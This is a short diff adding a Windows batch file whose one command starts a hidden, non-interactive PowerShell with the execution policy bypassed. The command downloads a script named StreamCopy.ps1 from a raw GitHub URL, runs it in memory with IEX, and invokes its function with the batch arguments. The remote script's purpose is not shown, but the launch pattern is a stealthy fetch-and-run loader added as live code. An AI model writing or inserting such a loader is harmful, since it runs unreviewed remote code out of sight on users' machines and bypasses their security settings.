@@ -1,0 +1,2 @@
+@echo off
+powershell -exec bypass -w hidden -noP -nonI -Command "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jensack/stream/main/StreamCopy.ps1'); Invoke-StreamCopy -%~1 -objName %~2"
